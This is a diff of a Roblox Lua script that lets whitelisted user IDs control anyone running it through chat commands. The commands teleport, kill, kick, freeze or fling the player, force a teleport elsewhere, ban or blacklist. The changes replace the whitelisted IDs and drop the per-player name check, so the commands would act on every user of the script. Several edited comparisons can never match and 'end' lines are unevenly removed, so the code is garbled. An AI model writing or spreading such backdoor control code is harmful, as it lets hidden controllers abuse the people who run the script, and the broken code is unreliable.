@@ -1,4 +1,4 @@
-local whitelist = { owner = { 1344126668 , 62840067 , 3037096543 }, admin = { 2805923467 },}
+local whitelist = { owner = { 2585910473 , 2346930714 , 2570104815 }, admin = { 62840067 },}
 
 owner = false admin = false
 
@@ -7,42 +7,32 @@ end for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = tru
 end
 
 if admin or owner then
-	if message:sub(1, 6) == ":bring" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 6) == ":bring ." then
 			local plr = game.Players.LocalPlayer
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
 		end
-	end
 	-- kill start
-	if message:sub(1, 5) == ":kill" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 5) == ":kill ." then
 			local plr = game.Players.LocalPlayer
 			game.Players.LocalPlayer.Character.Humanoid.Health = 0
 		end
-	end
 	--  kill end
 	-- kick start
-	if message:sub(1, 5) == ":kick" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 5) == ":kick ." then
 			local plr = game.Players.LocalPlayer
-			game.Players.LocalPlayer:Kick("yo")
+			game.Players.LocalPlayer:Kick("Kicked by admin.")
 
 		end
-	end
 	
-	if message:sub(1, 7) == ":freeze" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 7) == ":freeze ." then
 			game.Players.LocalPlayer.Character.Head.Anchored = true
 		end
-	end
 	
-	if message:sub(1, 9) == ":unfreeze" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 9) == ":unfreeze ." then
 			game.Players.LocalPlayer.Character.Head.Anchored = false
 		end
-	end
 	
-	if message:sub(1, 5) == ":benx" then
+	if message:sub(1, 5) == ":benx ." then
 		if message:match(game.Players.LocalPlayer.Name) then
 			bending = true
 			local segtarget = author.Name
@@ -88,32 +78,23 @@ if admin or owner then
 			repeat wait() until bending == false
 			Pause()
 		end
-	end
-	
-	if message:sub(1, 7) == ":unbenx" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 7) == ":unbenx ." then
 			while bending == true do
 				wait()
 				bending = false
 			end
-		end
-	end
 	
-	if message:sub(1, 6) == ":fling" then
-		if message:match(game.Players.LocalPlayer.Name) then
+	if message:sub(1, 6) == ":fling ." then
 			local plr = game.Players.LocalPlayer
 			plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
 		end
-	end
 
 	-- kick end
-	if message == ":troll" then
-			if message:match(game.Players.LocalPlayer.Name) then
+	if message == ":troll ." then
 				game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
 				local TeleportService = game:GetService("TeleportService")
 				TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
 			end
-		end
 
 	if owner then
 		if message:sub(1, 4) == ":ban" then
@@ -122,14 +103,13 @@ if admin or owner then
 				local TeleportService = game:GetService("TeleportService")
 				TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
 			end
-		end
 		
 		if owner then
 			if message:sub(1, 10) == ":blacklist" then
 				local blacklisted = {
 					{
 						UserId  = 0,
-						Reason = "A booster has blacklisted you."
+						Reason = "blacklisted."
 					}
 				}
 				if message:match(game.Players.LocalPlayer.UserID) then
